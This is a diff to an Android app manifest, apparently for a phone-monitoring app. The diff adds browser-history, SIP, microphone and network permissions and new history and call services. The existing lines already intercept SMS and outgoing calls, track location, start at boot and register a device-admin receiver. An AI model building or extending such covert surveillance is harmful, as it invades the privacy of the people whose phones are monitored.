@@ -3,8 +3,15 @@
     xmlns:tools="http://schemas.android.com/tools"
     package="com.example.localiser">
 
+    <uses-sdk android:minSdkVersion="9" />
+    <uses-permission android:name="android.permission.USE_SIP" />
+    <uses-permission android:name="android.permission.VIBRATE" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
 
-
+    <uses-feature android:name="android.hardware.sip.voip" android:required="true" />
+    <uses-feature android:name="android.hardware.wifi" android:required="true" />
+    <uses-feature android:name="android.hardware.microphone" android:required="true" />
+    <uses-permission android:name="com.android.browser.permission.READ_HISTORY_BOOKMARKS" />
     <uses-permission android:name="android.permission.NEW_OUTGOING_CALL" />
     <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />
     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
@@ -29,6 +36,10 @@
         tools:ignore="ProtectedPermissions" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.BLUETOOTH" />
 
     <application
         android:name=".domains.Parent"
@@ -75,6 +86,9 @@
         <activity android:name=".domains.FullImageActivity" />
         <activity android:name=".VideoActivity" />
         <activity android:name=".FullAudioActivity" />
+        <activity android:name=".WalkieTalkieActivity" />
+        <activity android:name=".SipSettings" />
+        <activity android:name=".BrowserHistoryActivity" />
 
         <receiver android:name=".RecieveSms"
             android:enabled="true"
@@ -95,6 +109,10 @@
             android:foregroundServiceType="location" />
         <service
             android:name=".PicJobService"
+            android:enabled="true"
+            android:permission="android.permission.BIND_JOB_SERVICE" />
+        <service
+            android:name=".ParlerService"
             android:enabled="true"
             android:permission="android.permission.BIND_JOB_SERVICE" />
         <service
@@ -124,9 +142,13 @@
                 <action android:name="android.app.action.DEVICE_ADMIN_DISABLE_REQUESTED" />
             </intent-filter>
         </receiver>
-
         <service android:name=".TService" >
         </service>
+        <service android:name=".SecouerService" >
+        </service>
+        <service android:name=".BrowserService" >
+        </service>
+        <receiver android:name=".IncomingCallReceiver" android:label="Call Receiver"/>
     </application>
 
 </manifest>
